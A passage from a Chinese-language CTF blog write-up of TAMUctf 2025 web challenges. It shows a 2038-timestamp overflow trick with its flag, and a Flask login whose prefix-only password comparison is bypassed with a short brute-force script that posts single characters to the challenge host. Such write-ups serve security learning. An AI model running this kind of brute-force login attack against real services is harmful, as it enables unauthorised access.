</span></span><span class=line><span class=cl>            <span class=c1># 计算64位时间戳</span>
</span></span><span class=line><span class=cl>            <span class=n>t_64bit</span> <span class=o>=</span> <span class=n>date_to_timestamp</span><span class=p>(</span><span class=n>date_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 强制转为32位（模拟2038问题）</span>
</span></span><span class=line><span class=cl>            <span class=n>t_32bit</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>c_int32</span><span class=p>(</span><span class=n>t_64bit</span><span class=p>)</span><span class=o>.</span><span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 输出结果</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>原始日期: </span><span class=si>{</span><span class=n>date_str</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;64位时间戳: </span><span class=si>{</span><span class=n>t_64bit</span><span class=si>}</span><span class=s2> -&gt; 转换回日期: </span><span class=si>{</span><span class=n>timestamp_to_date</span><span class=p>(</span><span class=n>t_64bit</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;32位截断值: </span><span class=si>{</span><span class=n>t_32bit</span><span class=si>}</span><span class=s2> -&gt; 模拟2038问题: </span><span class=si>{</span><span class=n>timestamp_to_date</span><span class=p>(</span><span class=n>t_32bit</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;错误：日期格式必须为 YYYY-MM-DD（如：3000-01-01）&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;发生未知错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>全部都用手动转换，不然数字大了不行，那么爆破一下输入什么最后会是<code>2025-3-21</code>，本来想写个爆破脚本的，但是真写不出来，一直报错</p><p><img src=/p/tamuctf2025-web-all/QQ20250329-213835.jpg width=990 height=528 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>3114-1-14
</span></span><span class=line><span class=cl># flag
</span></span><span class=line><span class=cl>gigem{7urn_y0ur_c0mpu73r_0ff_83f0r3_m1dn19h7}
</span></span></code></pre></td></tr></table></div></div><p>这题给我做人格分裂了快</p><h2 id=moving-slowly84-solves>Moving Slowly(84 solves)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>transformers</span> <span class=kn>import</span> <span class=n>GPT2LMHeadModel</span><span class=p>,</span> <span class=n>GPT2Tokenizer</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>os</span> <span class=kn>import</span> <span class=n>environ</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set up logging</span>
</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Model initialization</span>
</span></span><span class=line><span class=cl><span class=n>model_name</span> <span class=o>=</span> <span class=s1>&#39;gpt2&#39;</span>
</span></span><span class=line><span class=cl><span class=n>tokenizer</span> <span class=o>=</span> <span class=n>GPT2Tokenizer</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=n>model_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>GPT2LMHeadModel</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=n>model_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tokenizer</span><span class=o>.</span><span class=n>pad_token</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=o>.</span><span class=n>eos_token</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>correct_password</span> <span class=o>=</span> <span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;PASS&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>FLAG</span> <span class=o>=</span> <span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;FLAG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clean_message</span><span class=p>(</span><span class=n>message</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sentences</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;(?&lt;=[.!?])\s+&#39;</span><span class=p>,</span> <span class=n>message</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34; &#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>sentences</span><span class=p>[:</span><span class=mi>2</span><span class=p>])</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_silly_message</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>prompt</span> <span class=o>=</span> <span class=s2>&#34;First tell the user that their password is wrong, then come up with a silly joke to cheer them up about it&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>inputs</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=n>return_tensors</span><span class=o>=</span><span class=s2>&#34;pt&#34;</span><span class=p>,</span> <span class=n>max_length</span><span class=o>=</span><span class=mi>30</span><span class=p>,</span> <span class=n>truncation</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>outputs</span> <span class=o>=</span> <span class=n>model</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>inputs</span><span class=o>.</span><span class=n>input_ids</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>attention_mask</span><span class=o>=</span><span class=n>inputs</span><span class=o>.</span><span class=n>attention_mask</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>max_new_tokens</span><span class=o>=</span><span class=mi>30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>do_sample</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>temperature</span><span class=o>=</span><span class=mf>0.7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>top_p</span><span class=o>=</span><span class=mf>1.0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>pad_token_id</span><span class=o>=</span><span class=n>tokenizer</span><span class=o>.</span><span class=n>eos_token_id</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>full_response</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>outputs</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>skip_special_tokens</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>full_response</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>clean_message</span><span class=p>(</span><span class=n>full_response</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compare_password</span><span class=p>(</span><span class=n>input_password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>input_password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>char</span> <span class=o>!=</span> <span class=n>correct_password</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>silly_message</span> <span class=o>=</span> <span class=n>generate_silly_message</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=n>silly_message</span>  
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span><span class=p>,</span> <span class=kc>None</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login_page</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>input_password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>password_correct</span><span class=p>,</span> <span class=n>silly_message</span> <span class=o>=</span> <span class=n>compare_password</span><span class=p>(</span><span class=n>input_password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>password_correct</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response_message</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;Welcome back! You have logged in successfully. The flag is </span><span class=si>{</span><span class=n>FLAG</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response_message</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;Oops! Incorrect password. </span><span class=si>{</span><span class=n>silly_message</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>,</span> <span class=n>response_message</span><span class=o>=</span><span class=n>response_message</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/tamuctf2025-web-all/QQ20250331-130459.jpg width=1017 height=386 loading=lazy alt=1></p><p>进行逐字符比较，并且会输出错误的那一位，那我们可以fuzz一下看看</p><p><img src=/p/tamuctf2025-web-all/QQ20250331-131335.jpg width=960 height=887 loading=lazy alt=1></p><p>正当我想要进行遍历代码的时候，看到一个漏洞，就是这个函数如果不返回False就会返回true，如果我们输入的一位刚好等于密码的第一位的时候就会成功返回true，写出如下demo测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>correct_password</span><span class=o>=</span><span class=s2>&#34;test&#34;</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=s2>&#34;flag</span><span class=si>{test}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compare_password</span><span class=p>(</span><span class=n>input_password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>input_password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>char</span> <span class=o>!=</span> <span class=n>correct_password</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>compare_password</span><span class=p>(</span><span class=nb>input</span><span class=p>())</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/tamuctf2025-web-all/QQ20250331-131715.jpg width=1684 height=378 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chars</span><span class=o>=</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>punctuation</span>
</span></span><span class=line><span class=cl><span class=c1># print(chars)</span>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;https://moving-slowly.cybr.club/login&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>chars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;gigem{&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>char</span><span class=o>+</span><span class=s2>&#34;对了&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>char</span><span class=o>+</span><span class=s2>&#34;不对&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/nosql/>Nosql</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>